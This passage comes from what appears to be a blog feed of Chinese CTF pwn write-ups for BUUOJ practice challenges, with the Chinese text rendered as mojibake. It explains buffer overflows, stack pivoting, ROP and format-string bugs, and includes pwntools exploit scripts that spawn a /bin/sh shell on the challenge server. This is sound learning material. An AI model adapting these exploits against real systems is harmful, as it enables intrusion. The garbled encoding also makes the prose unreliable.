ˆä¸Šè·ç¦»/bin/shæœ‰0x50çš„é•¿åº¦</span><br>payload+=p64(pop_rdi)+p64(binsh)+p64(syscall)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h4 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ</h4><p>åé¢æœ‰ç¼˜å†æ›´æ–°å§ï¼Œï¼Œï¼Œï¼Œ</p>
<h3 id="åå…­ã€ciscn-2019-es-2"><a href="#åå…­ã€ciscn-2019-es-2" class="headerlink" title="åå…­ã€ciscn_2019_es_2"></a>åå…­ã€ciscn_2019_es_2</h3><p>å¸¸è§„checksecæŸ¥çœ‹ä¿æŠ¤æªæ–½</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210501105608.png"></p>
<p>ç¨‹åºåªå¼€å¯äº†NXï¼Œåº”è¯¥æ˜¯é“è¾ƒä¸ºç®€å•çš„é¢˜ç›®ï¼Œè¿›å…¥idaçœ‹çœ‹æƒ…å†µ</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210501105715.png"></p>
<p>è¿™é‡Œæ€»å…±è¾“å…¥äº†ä¸¤æ¬¡æ•°æ®ï¼ŒåŒæ—¶è¿˜èƒ½printfå‡ºæ¥ï¼Œå¯èƒ½ä¼šæ³„éœ²ä¸€äº›é‡è¦åœ°å€ä¿¡æ¯ã€‚è¿™é‡Œçš„readå‡½æ•°å…¨éƒ¨è¢«é™åˆ¶åˆ°åªå¤Ÿåˆšå¥½è¦†ç›–åˆ°è¿”å›åœ°å€å°±ä¸èƒ½å†ç»§ç»­å¡«å……äº†ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯ç”¨äº†æ ˆè¿ç§»çš„æ€æƒ³ï¼ŒæŠŠæ ˆè¿ç§»åˆ°æ ˆä¸Šï¼Œåˆ¶é€ ä¸€ä¸ªå‡æ ˆã€‚</p>
<p>æ ˆè¿ç§»åˆ©ç”¨leave å’ŒretæŒ‡ä»¤æ”¹å˜ebpå’Œespçš„æŒ‡å‘ä½ç½®ï¼Œæ‰€ä»¥è¦å…ˆå¾—åˆ°è¦è¿ç§»çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯sä½ç½®ï¼Œè¿™è¾¹æ³„éœ²ebpçš„å€¼ï¼Œä»è€Œè®¡ç®—ä¸¤è€…åå·®</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210501110624.png"></p>
<p>æœ€é¡¶ä¸Š0xfffcd65å°±æ˜¯sçš„ä½ç½®ï¼Œè€Œ0xffcd678å°±æ˜¯ebpæŒ‡å‘çš„ä½ç½®ï¼Œè€Œåœ¨è¯¥åœ°å€å¤„çš„å†…å®¹ä¸º0xfffcd688å°±æ˜¯æˆ‘ä»¬æ³„éœ²å‡ºæ¥çš„å†…å®¹ï¼Œä¸såå·®ä¸º0x38</p>
<p>è€Œç³»ç»Ÿå‡½æ•°é™„ä»¶ä¸­å·²ç»æœ‰äº†systemçš„è°ƒç”¨ï¼Œå·®çš„å°±åªæœ‰/bin/shçš„å­—ç¬¦ä¸²äº†ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å†™åœ¨æ ˆä¸Šï¼Œç„¶åä»ç„¶æ˜¯ç”¨æ³„éœ²å‡ºæ¥çš„åœ°å€ç®—å‡º/bin/shåœ°å€ï¼Œä½œä¸ºå‚æ•°å³å¯</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27262</span>)<br><span class="hljs-comment">#p=process(&#x27;./1&#x27;)</span><br>system=<span class="hljs-number">0x8048400</span><br>leave_ret=<span class="hljs-number">0x80484b8</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">&#x27;bbbbbbbb&#x27;</span><br>p.recvline()<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&#x27;bbbbbbbb&#x27;</span>)<br>ebp=u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(ebp)<br>s_buf=ebp-<span class="hljs-number">0x38</span><br><br>p.recvline()<br>payload=<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(system)+<span class="hljs-string">&#x27;dead&#x27;</span>+p32(ebp-<span class="hljs-number">0x28</span>)+<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p32(s_buf)+p32(leave_ret)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buu02</title>
    <url>/2021/04/05/2021-04-05-buu02/</url>
    <content><![CDATA[<h1 id="buuâ€”â€”pwnå­¦ä¹ "><a href="#buuâ€”â€”pwnå­¦ä¹ " class="headerlink" title="buuâ€”â€”pwnå­¦ä¹ "></a>buuâ€”â€”pwnå­¦ä¹ </h1><h3 id="å››ã€ciscn-2019-n-8"><a href="#å››ã€ciscn-2019-n-8" class="headerlink" title="å››ã€ciscn_2019_n_8"></a>å››ã€ciscn_2019_n_8</h3><p>checksecä¸€ä¸‹<img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405201012.png">å‘ç°ä¿æŠ¤åŸºæœ¬éƒ½å¼€äº†ï¼Œæœ‰ç‚¹å®³æ€•ï¼Œèµ¶ç´§è¿›å…¥idaä¸€æ¢ç©¶ç«Ÿï¼š</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405202606.png"></p>
<p>å¥½å§ï¼Œæ˜¯æˆ‘æƒ³å¤šäº†ï¼Œè¾¾æˆæ¡ä»¶å¾ˆç®€å•ï¼Œå°±æ˜¯è®©var[13]çš„å€¼ç­‰äº17å°±å¯ä»¥è·å–shellï¼Œè¿™é‡Œè¦æ³¨æ„ä¸€ç‚¹ï¼Œvaræ˜¯intç±»å‹æ•°ç»„ï¼Œæ‰€ä»¥å¡«å……çš„æ—¶å€™ï¼Œæ¯”å¦‚var[0]å°±è¦å¡«è¿›å»4ä¸ªå­—èŠ‚çš„å†…å®¹æ‰èƒ½å¡«æ»¡ï¼ˆè¿™é‡Œæˆ‘åˆšå¼€å§‹ç–å¿½äº†ï¼Œä¸€ç›´æ²¡èƒ½è·å–æƒé™ã€‚ã€‚ï¼‰æ‰€ä»¥è¦æ˜¯ç”¨aå»å¡«å……è¦å…ˆå¡«52ä¸ªæ‰è¡Œï¼Œä¹‹åæ‰æ˜¯è¾“å…¥17ï¼Œä¸è¿‡å¦‚æœç›´æ¥ä½¿ç”¨p32ä¼šæ›´æ–¹ä¾¿ä¸€äº›ï¼Œexpå¦‚ä¸‹ï¼š</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405205400.png"></p>
<h3 id="äº”ã€not-the-same-3dsctf-2016"><a href="#äº”ã€not-the-same-3dsctf-2016" class="headerlink" title="äº”ã€not_the_same_3dsctf_2016"></a>äº”ã€not_the_same_3dsctf_2016</h3><p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405205812.png"></p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405205847.png"></p>
<p>æŸ¥çœ‹ä¸€ä¸‹å¼€å¯äº†nxä¿æŠ¤ï¼Œä»¥åŠä¸€éƒ¨åˆ†çš„relroï¼Œç„¶åè¿è¡Œäº†ä¸€ä¸‹ï¼Œå¥½åƒä»€ä¹ˆéƒ½æ²¡æœ‰ã€‚ã€‚æ‹–å…¥idaçœ‹çœ‹</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405210102.png"></p>
<p>å¥½å®¶ä¼™ï¼Œmainå‡½æ•°é‡Œé¢çš„ä¸œè¥¿ï¼Œä»¥åŠå‡½æ•°çª—å£é‡Œé¢çš„æƒ…å†µè®©æˆ‘æƒ³èµ·äº†<strong>get_started_3dsctf_2016</strong>è¿™é¢˜ï¼Œä¼¼ä¹å¾ˆåƒçš„æ ·å­<img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405210308.png"></p>
<p>åŒæ ·çš„ä¸ç”¨è¦†ç›–ebpï¼Œç›´æ¥å°±èƒ½åˆ°è¿”å›åœ°å€äº†ï¼Œä¸æ¸…æ¥šåŸç†ã€‚ã€‚æš‚ä¸”ä¸ç®¡å§ï¼Œä»¥åå¯èƒ½ä¼šçœ‹åˆ°çš„</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405211241.png"></p>
<p>è¿™é‡Œæœ‰ä¸ªå‡½æ•°ï¼Œå·²ç»å°†flagçš„å€¼è¯»å–å¹¶è¾“å…¥åˆ°äº†fl4gçš„ä½ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆç”¨è¿™ä¸ªå‡½æ•°å¡«å……åˆ°è¿”å›åœ°å€å¤„ï¼ŒæŠŠflagå…ˆè¯»å–åˆ°fl14ä¸ºèµ·å§‹åœ°å€çš„å†…å­˜ä¸­ï¼Œæ¥ä¸‹æ¥è¯•ç€æŠŠè¿™é‡Œçš„å†…å®¹æ³„éœ²å‡ºæ¥ï¼Œå³å¯è·å–flagã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦writeå‡½æ•°ï¼Œå¹¶ä¸”å› ä¸ºwriteå‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œæ‰€ä»¥è¿˜éœ€è¦pop ä¸‰ä¸ªå¯„å­˜å™¨çš„æŒ‡ä»¤è¿›è¡Œæ¸…ç†æ ˆï¼Œæœ€åçš„p32(0)æ˜¯popä¸­å«ç€çš„retæ“ä½œï¼Œæ‰€ä»¥è¿˜éœ€è¦å†åŠ ä¸€ä¸ªè¿”å›åœ°å€ï¼Œå› ä¸ºæˆ‘ä»¬å·²ç»è¾“å‡ºäº†flagï¼Œæ‰€ä»¥è¿”å›åœ°å€å¹¶ä¸éœ€è¦åœ¨æ„æ˜¯å“ªï¼Œéšä¾¿éƒ½å¯ã€‚å…·ä½“expå¦‚ä¸‹ï¼š</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405212259.png"></p>
<h3 id="å…­ã€-HarekazeCTF2019-baby-rop"><a href="#å…­ã€-HarekazeCTF2019-baby-rop" class="headerlink" title="å…­ã€[HarekazeCTF2019]baby_rop"></a>å…­ã€[HarekazeCTF2019]baby_rop</h3><p>åªå¼€å¯äº†nxå’Œéƒ¨åˆ†çš„relroä¿æŠ¤æœºåˆ¶ï¼Œå¹¶ä¸”è¿è¡Œäº†æ²¡æœ‰å¤šå°‘çš„å†…å®¹ï¼Œå¾ˆæ­£å¸¸çš„å†…å®¹å›æ˜¾ã€‚åº”è¯¥ä¸ä¼šéš¾çš„ï¼Œå—¯ï¼Œå…ˆè¿™ä¹ˆæƒ³ã€‚</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405212721.png"></p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405212741.png"></p>
<p>è¿›å…¥idaçœ‹çœ‹ï¼Œæ˜¯ä¸æ˜¯è·Ÿæƒ³è±¡çš„ä¸€æ ·ç®€å•</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405213207.png"></p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405213218.png"></p>
<p>çš„ç¡®å¦‚æ­¤ï¼Œæ²¡æœ‰ä¹±èµ·åå­—ã€‚ã€‚ç¡®å®æ˜¯ç®€å•çš„ropï¼Œsystemå‡½æ•°å’Œ/bin/shå­—ç¬¦å…¨éƒ½åœ¨ï¼Œå¹¶ä¸”è¿˜æœ‰scanfçš„æ— é™åˆ¶è¾“å…¥ï¼Œexpå¦‚ä¸‹ï¼š</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405214535.png"></p>
<p>å°æ’æ›²ï¼Œæˆ‘è¿›å…¥çš„æ—¶å€™ï¼Œå¾ˆæƒŠè®¶çš„å‘ç°æ²¡æœ‰flagã€‚ã€‚ã€‚ä¸çŸ¥é“æ˜¯ç®¡ç†å‘˜å¿˜äº†ï¼Œè¿˜æ˜¯è¯´å“ªä¸ªäººåšäº†ä¸å°å¿ƒå¯èƒ½åˆ äº†å§ã€‚ã€‚</p>
<h3 id="ä¸ƒã€jarvisoj-level2-x64"><a href="#ä¸ƒã€jarvisoj-level2-x64" class="headerlink" title="ä¸ƒã€jarvisoj_level2_x64"></a>ä¸ƒã€jarvisoj_level2_x64</h3><p>åªå¼€å¯äº†nxï¼Œè¿è¡Œä¸€ä¸‹ï¼Œè²Œä¼¼ä¹Ÿå¾ˆç®€å•çš„æ ·å­ï¼Œé¢„æµ‹å¯èƒ½è·Ÿ32ä½çš„level2å·®ä¸å¤šå§ï¼Œå°±æ˜¯å˜åˆ°äº†64ä½çš„ç¯å¢ƒä¸‹ï¼Œå¯èƒ½ä¸ºäº†è€ƒéªŒä¼ å‚</p>
<p><img src="/2021/04/05/2021-04-05-buu02/image-20210405220229158.png" alt="image-20210405220229158"></p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405220316.png"></p>
<p>åšæ³•è·Ÿä¸Šä¸€é¢˜å·®ä¸å¤šå§ï¼Œå°±ä¸å¤šæ”¾å›¾ç‰‡äº†ï¼Œç›´æ¥expäº†ï¼š</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210405221357.png"></p>
<h3 id="å…«ã€ciscn-2019-n-5"><a href="#å…«ã€ciscn-2019-n-5" class="headerlink" title="å…«ã€ciscn_2019_n_5"></a>å…«ã€ciscn_2019_n_5</h3><p>å¥½å®¶ä¼™ï¼Œnxéƒ½æ²¡å¼€å¯ï¼Œå¯èƒ½è¦ç›´æ¥åœ¨æ ˆä¸Šæ‰§è¡Œshellcodeäº†</p>
<p><img src="/2021/04/05/2021-04-05-buu02/image-20210407194309117.png" alt="image-20210407194309117"></p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210407194556.png"></p>
<p>ç¡®å®çš„ï¼Œæœ‰ä¸ªgetsæ— é™è¾“å…¥ï¼Œå¾ˆæ˜æ˜¾å¯ä»¥è¢«åˆ©ç”¨çš„æº¢å‡ºç‚¹ã€‚ä¸è¿‡åé¢å¸¦äº†ä¸ªnameæœ‰ç‚¹å¥‡æ€ªï¼Œè¿›å…¥çœ‹çœ‹æ±‡ç¼–æ˜¯ä»€ä¹ˆæƒ…å†µ</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210407194714.png"></p>
<p>å¥½å§ï¼Œåº”è¯¥æ˜¯idaå‡ºé”™äº†ä¸€äº›ï¼Œåªæœ‰è°ƒç”¨äº†textï¼Œé‚£å°±ç›´æ¥è¿›è¡Œè¦†ç›–å§ã€‚å› ä¸ºpwntoolså·²ç»æœ‰ç€è‡ªå¸¦çš„shellcodeæ³¨å…¥äº†ï¼Œï¼ˆè¦æ˜¯æ²¡æœ‰çš„è¯æˆ‘ä¹Ÿä¸ä¼šå†™äº†ï¼Œå“ˆå“ˆå“ˆï¼‰expå¦‚ä¸‹ï¼š</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210407201139.png"></p>
<p>è¿™é‡Œä¸€å¼€å§‹æ˜¯æƒ³ç›´æ¥å°±åœ¨æ ˆä¸Šæ³¨å…¥shellcodeçš„ï¼Œä¸è¿‡æ²¡èƒ½æˆåŠŸï¼Œå¯èƒ½æ˜¯å› ä¸ºå¤ªé•¿è¦†ç›–äº†ä¸€äº›å…¶ä»–ä¿¡æ¯äº†å§ï¼Œæ‰€ä»¥å°±è½¬ç§»åˆ°bssä¸Šæ‰§è¡Œï¼Œåœ¨gdbä¸­ä¹Ÿèƒ½æŸ¥çœ‹åˆ°bssä¹Ÿå…·æœ‰å¯æ‰§è¡Œæ€§</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210407201152.png"></p>
<h3 id="ä¹ã€ciscn-2019-ne-5"><a href="#ä¹ã€ciscn-2019-ne-5" class="headerlink" title="ä¹ã€ciscn_2019_ne_5"></a>ä¹ã€ciscn_2019_ne_5</h3><p>å¼€å¯äº†nxå’Œéƒ¨åˆ†çš„relroç¼“è§£æªæ–½</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210407201501.png"></p>
<p>è¿›å…¥idaæŒ‰F5ä¼šåç¼–è¯‘å¤±è´¥ï¼Œåªè¦è¿›å…¥åˆ°å¯¹åº”åœ°å€çš„scanfå‡½æ•°é‡Œé¢æŒ‰F5å¯¹å‡½æ•°ç¼–è¯‘ï¼Œå†å›åˆ°mainå‡½æ•°å³å¯åç¼–è¯‘æˆåŠŸ</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210407204835.png"></p>
<p>é¦–å…ˆæŠŠç¬¬ä¸€ä¸ªå¯†ç ç»•è¿‡ï¼Œè¾“å…¥administratorå³å¯ï¼Œå½“æˆ‘ä»¬è¿›å…¥ä¸‹é¢é¢printå‡½æ•°æŸ¥çœ‹å¯ä»¥å‘ç°æœ‰systemå‡½æ•°çš„è°ƒç”¨ï¼Œæ­¤æ—¶æˆ‘ä»¬åªéœ€è¦å†æŸ¥æ‰¾åˆ°å‚æ•°å’Œæº¢å‡ºç‚¹å³å¯ï¼Œå¾€ä¸Šçœ‹ï¼Œè°ƒç”¨äº†fflushå‡½æ•°ï¼Œé‡Œé¢æœ‰shå­—ç¬¦ä¸²ã€‚è¿™é‡Œæœ‰ä¸ªç‚¹ï¼Œshå­—ç¬¦ä¸²ä¹Ÿå¯ä»¥æˆä¸ºsystemçš„å‡½æ•°è·å–åˆ°shellçš„æƒé™ã€‚é‚£ä¹ˆåªå‰©ä¸‹æº¢å‡ºç‚¹äº†ã€‚å‰é¢çš„scanfå‡½æ•°è¾“å…¥ï¼Œéƒ½æ— æ³•æº¢å‡ºã€‚åªæœ‰åœ¨Addlogé‡Œé¢çš„scanfå‡½æ•°å¯ä»¥è¦†ç›–ï¼Œç„¶åå†å»åˆ°å‡½æ•°4GetFlagé‡Œé¢</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210407204813.png"></p>
<p>æœ‰ä¸ªstrcpyå‡½æ•°ï¼Œå¯ä»¥æŠŠä¹‹å‰è¾“å…¥çš„srcå¤åˆ¶åˆ°destä¸­ï¼Œé€ æˆæº¢å‡ºã€‚expå¦‚ä¸‹ï¼š</p>
<p><img src="/2021/04/05/2021-04-05-buu02/QQ%E5%9B%BE%E7%89%8720210407213005.png"></p>
<p>expè¿˜æœ‰ä¸ªè¦æ³¨æ„çš„å°±æ˜¯systemåè·Ÿçš„è¿”å›åœ°å€ä¸èƒ½å†™p32(0)è¿™æ ·çš„ï¼Œå› ä¸ºè¿™ä¹ˆå†™ï¼Œscanfå‡½æ•°é‡åˆ°â€™\x00â€™ä¼šåœæ­¢è¯»å–ï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œé€‰æ‹©ç›´æ¥å†™å››ä¸ªå­—ç¬¦ä¸²</p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buu01</title>
    <url>/2021/04/04/2021-04-04-buu01/</url>
    <content><![CDATA[<h1 id="buuâ€”â€”pwnå­¦ä¹ "><a href="#buuâ€”â€”pwnå­¦ä¹ " class="headerlink" title="buuâ€”â€”pwnå­¦ä¹ "></a>buuâ€”â€”pwnå­¦ä¹ </h1><h3 id="ä¸€ã€-ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5"><a href="#ä¸€ã€-ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5" class="headerlink" title="ä¸€ã€[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5"></a>ä¸€ã€[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5</h3><p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404104030.png"></p>
<p>checksecä¸€ä¸‹ï¼Œ32ä½æ–‡ä»¶ï¼Œå¼€å¯äº†nxä¸canaryä¿æŠ¤æªæ–½</p>
<p>æ‹–å…¥idaé™æ€åˆ†æ</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404104056.png"></p>
<p>åœ¨mainå‡½æ•°å°±å¯ä»¥å¾ˆæ¸…æ™°çš„å‘ç°ï¼Œæœ‰ä¸ªåˆ¤æ–­è¯­å¥æˆç«‹å°±å¯ä»¥è·å–shellï¼Œç„¶ååˆ†æè¯¥å¦‚ä½•ä½¿ifåˆ¤æ–­æˆç«‹ï¼Œå¯ä»¥å‘ç°ï¼Œè¦ç›¸ç­‰çš„æ˜¯ä¸€ä¸ªéšæœºæ•°ï¼Œå¯¹äºéšæœºæ•°ä¸€èˆ¬éƒ½æ˜¯è¦†ç›–æˆæˆ‘ä»¬å·²çŸ¥çš„ä¸€ä¸ªæ•°å€¼ï¼Œæ¥ç€çœ‹ï¼Œå­˜åœ¨äº†printf(&amp;buf)å­—ç¬¦ä¸²æ¼æ´ï¼Œå¾ˆæ˜¾ç„¶å·²ç»å¯ä»¥åˆ©ç”¨äº†ï¼Œè®¡ç®—ä¸‹å­—ç¬¦ä¸²çš„åç§»</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404104049.png"></p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404104053.png"></p>
<p>ä¸¤ç§æ–¹å¼çš†å¯ç®—å‡ºåç§»ä¸º10ï¼Œæ„é€ %10$nï¼Œç›´æ¥è¾“å…¥åœ°å€å³å¯ï¼Œå› ä¸ºåœ¨32ä½ä¸‹ï¼Œè¾“å…¥çš„å°±æ˜¯4å­—èŠ‚çš„æ•°ï¼Œåˆšå¥½è¦†ç›–äº†éšæœºæ•°expå¦‚ä¸‹ï¼š</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404105030.png"></p>
<h3 id="äºŒã€get-started-3dsctf-2016"><a href="#äºŒã€get-started-3dsctf-2016" class="headerlink" title="äºŒã€get_started_3dsctf_2016"></a>äºŒã€get_started_3dsctf_2016</h3><p>è€è§„çŸ©ï¼Œä¸‹è½½å®Œé™„ä»¶ï¼Œchecksecä¸€ä¸‹ï¼š<img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404162136.png"></p>
<p>çœ‹èµ·æ¥æ²¡ä»€ä¹ˆï¼ŒidaæŸ¥çœ‹ä¸€ä¸‹ï¼Œ</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404162232.png"></p>
<p>å¾ˆç®€å•ï¼Œè€Œä¸”æº¢å‡ºç‚¹ä¹Ÿååˆ†æ˜æ˜¾ï¼Œç›´æ¥getæ— é™è¾“å…¥äº†</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404162344.png"></p>
<p>ä¼¼ä¹è¿˜å¾ˆå¥½åœ°å­˜åœ¨äº†åé—¨å‡½æ•°ï¼Œflagå°±åœ¨çœ¼å‰ï¼Ÿï¼Ÿï¼Ÿå½“ç„¶ä¸å¯èƒ½ï¼</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404162512.png"></p>
<p>å½“ä½ æŠŠexpå†™æˆè¿™æ ·çš„æ—¶å€™ï¼ˆä¸æ˜¯å†™çš„ï¼Œæˆ‘å†™çš„åœ¨å‘ç°ä¸è¡Œå°±ç»™åˆ äº†ï¼Œæ‡’å¾—å†å†™ï¼Œç™¾åº¦ä¸Šæ‹¿æ¥çš„ï¼‰ï¼Œåªèƒ½åœ¨æœ¬æœºä¸Šæ‰èƒ½é¡ºåˆ©æ‰§è¡Œï¼Œåœ¨ä¸€ä¸ªåœ°æ–¹çœ‹åˆ°ï¼Œè¯´æ˜¯å› ä¸ºè¿œç¨‹ä¼šè¢«è¿‡æ»¤ï¼ŒæŠŠè·å–flagçš„åœ°å€è¿‡æ»¤ã€‚æ‰€ä»¥æ­¤æ—¶åªèƒ½æ¢ä¸€ç§æ–¹å¼è¿›è¡Œæ”»å‡»ï¼Œæ‰‹æ¡æ— é™è¾“å…¥ï¼Œä¸å¿…å¤ªæ…Œå¼ ã€‚</p>
<p>æœ‰è¿™ä¹ˆä¸€ä¸ªå‡½æ•°*<em>int mprotect(const void <em>start, size_t len, int prot)</em></em> ç”¨æ¥ä¿®æ”¹å†…å­˜çš„æƒé™çš„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¿®æ”¹å†…å­˜çš„èµ·å§‹åœ°å€ï¼Œç¬¬äºŒä¸ªæ˜¯ä¿®æ”¹åœ°å€çš„é•¿åº¦ï¼Œç¬¬ä¸‰ä¸ªæ˜¯æƒé™å€¼ï¼ˆå¯è¯»ä¸º4ï¼Œå¯å†™2ï¼Œå¯æ‰§è¡Œä¸º1ï¼Œå³æ˜¯rwx 7ï¼‰ï¼Œæˆ‘ä»¬å°±è¦åˆ©ç”¨è¿™ä¸ªå‡½æ•°ï¼Œæ‰¾åˆ°ä¸€å—è¾ƒå¤§çš„å†…å­˜åœ°å€ï¼Œè¿›è¡Œä¿®æ”¹æƒé™ï¼Œç„¶åå†è°ƒç”¨readå‡½æ•°å¯¹è¿™å—å†…å­˜è¾“å…¥shellcodeï¼Œæœ€åè°ƒè½¬æ‰§è¡Œshellcodeï¼</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404163230.png"></p>
<p>åœ¨gdbé‡Œé¢è¾“å…¥vmmapæŒ‡ä»¤å¯ä»¥æŸ¥çœ‹åœ°å€çš„æƒé™ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©å¯è¯»å¯å†™çš„0x080ea00ä½œä¸ºèµ·å§‹åœ°å€ã€‚</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404163331.png"></p>
<p>åœ¨å†™payloadéœ€æ³¨æ„ï¼Œè¿™é‡Œä¸ç”¨è¦†ç›–ebpï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚ã€‚ä½†æ˜¯idaé‡Œé¢ç¡®å®æ˜¯è¿™æ ·çš„ã€‚æœ€åçš„expå¦‚ä¸‹ï¼š</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404163334.png"></p>
<p>å…¶ä¸­çš„pop_3å¯ä»¥é€šè¿‡ROPgadgetæŸ¥è¯¢å¾—åˆ°ï¼Œä½¿ç”¨è¿™ä¸ªæ˜¯å› ä¸ºè¦ä¿æŒå †æ ˆå¹³è¡¡ï¼Œä½¿å¾—ç¨‹åºæ­£å¸¸è¿è¡Œã€‚æˆ‘ä»¬åœ¨æ„å»ºmprotectå’Œreadå‡½æ•°æ—¶ï¼Œéœ€è¦ä¸æ–­çš„è¿”å›ç¨‹åºï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦æ¯”å¹³å¸¸çš„å¤šå‡ºpopè¿™ä¸ªæŒ‡ä»¤ï¼Œç”¨æ¥æ¸…ç†æˆ‘ä»¬è¾“å…¥æ ˆé‡Œçš„ä¸‰ä¸ªå‚æ•°ï¼Œè¾¾åˆ°å †æ ˆå¹³è¡¡ã€‚è¿™ä¸ªçœ‹ä½œæ˜¯ä¸€ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„è¿”å›åœ°å€ï¼Œä¸ä»…å¯ä»¥è¿”å›æ§åˆ¶eipæ‰§è¡Œæ ˆä¸Šçš„æŒ‡ä»¤ï¼Œè¿˜è¦é¡ºå¸¦çš„æ¸…ç†æˆ‘ä»¬å¤šè¾“å…¥çš„å‚æ•°ï¼Œä¿è¯espæŒ‡å‘çš„ä½ç½®å§‹ç»ˆä¸å˜åŒ–</p>
<h3 id="ä¸‰ã€ciscn-2019-en-2"><a href="#ä¸‰ã€ciscn-2019-en-2" class="headerlink" title="ä¸‰ã€ciscn_2019_en_2"></a>ä¸‰ã€ciscn_2019_en_2</h3><p>å…ˆchecksecä¸€ä¸‹é™„ä»¶</p>
<p><img src="/2021/04/04/2021-04-04-buu01/QQ%E5%9B%BE%E7%89%8720210404194652.png"></p>
